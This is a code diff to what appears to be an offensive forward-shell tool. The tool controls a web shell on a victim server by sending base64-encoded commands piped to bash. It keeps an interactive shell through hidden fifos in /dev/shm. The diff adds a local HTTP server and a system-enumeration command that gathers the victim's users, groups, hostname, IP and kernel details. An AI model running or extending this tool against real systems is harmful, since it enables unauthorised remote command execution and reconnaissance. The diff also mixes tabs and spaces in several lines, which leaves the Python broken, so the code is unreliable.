@@ -8,6 +8,7 @@ import sys
 import argparse
 from base64 import b64encode
 from random import randrange
+from http.server import HTTPServer, SimpleHTTPRequestHandler
 
 # ------------------------------------
 # Github: https://github.com/D3Ext
@@ -22,8 +23,10 @@ mybanner = '''\n              /\                               ______,....----,
 `^^^^^^^^^^^^^^|======================----------""""""
               \/'''
 
-global infile, outfile
+global infile, outfile, local_http_port, server
 mod = randrange(1, 9999)
+local_http_port = randrange(40000, 50000)
+server = HTTPServer(('localhost', local_http_port), SimpleHTTPRequestHandler)
 infile = f"/dev/shm/.fs/input.{mod}"
 outfile = f"/dev/shm/.fs/output.{mod}"
 
@@ -42,6 +45,7 @@ class c:
 def exit_handler(sig, frame):
     print(c.BLUE + "\n\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Interrupt handler received, exiting" + c.END)
     removeFiles(url, parameter)
+	server.shutdown()
     sys.exit(0)
 
 signal.signal(signal.SIGINT, exit_handler)
@@ -51,7 +55,7 @@ def removeFiles(url, parameter):
     removeCommand = """rm -rf /dev/shm/.fs/"""
     base64command = b64encode(removeCommand.encode()).decode()
     
-    removeData = {
+	removeData = {
         f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
     }
     
@@ -73,8 +77,15 @@ def checkConn(url):
         print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Connection established succesfully" + c.END)
     else:
         print(c.BLUE + "\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Connection refused\n" + c.END)
-        sys.exit(0)
+		sys.exit(0)
 
+# To forward a port to your localhost
+def createHttp():   
+	
+	thread = threading.Thread(target = server.serve_forever)
+	thread.daemon = True
+	thread.start()
+	
 # Function to create the fifos on the victim (to have an interactive tty)
 def createFifos(url, parameter):
 
@@ -234,7 +245,8 @@ if __name__ == '__main__':
 
     # Check connection to the web shell
     checkConn(url)
-
+	createHttp()
+	
     # Create an interactive shell
     createFifos(url, parameter)
 
@@ -264,18 +276,30 @@ if __name__ == '__main__':
             command_to_exec = input(user.strip('\n') + "@" + hostname.strip('\n') + ":~# ")
         else:
             command_to_exec = input(user.strip('\n') + "@" + hostname.strip('\n') + ":~$ ")
-
+        
+        if command_to_exec == "sysenum" or command_to_exec == "sys-enum":
+          user, hostname, ip, uname, id_output, users, path = enumSys(url, parameter)
+          print(c.YELLOW + "\nInformation" + c.END)
+          print(c.YELLOW + "-----------" + c.END)
+          print(c.BLUE + "User: " + user.strip('\n') + c.END)
+          print(c.BLUE + "ID and groups: " + id_output.strip('\n') + c.END)
+          print(c.BLUE + "Path: " + path.strip('\n') + c.END)
+          print(c.BLUE + "Hostname: " + hostname.strip('\n') + c.END)
+          print(c.BLUE + "IP: " + ip.strip('\n') + c.END)
+          print(c.BLUE + "Users in /home: " + users.strip('\n') + c.END)
+          print(c.BLUE + "System info: " + uname + c.END) 
+            
         if command_to_exec == "exit-shell" or command_to_exec == "shell-exit":
             removeFiles(url, parameter)
             print(c.BLUE + "[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Exiting from shell, bye!" + c.END)
             sys.exit(0)
 
         execCommand(url, parameter, command_to_exec + "\n")
-
+		# Read command output
         resp = readCommand(url, parameter)
-
+		# Print command output
         print(resp)
-
+		# Clear the file of the output
         clearOutput(url, parameter)
 
 
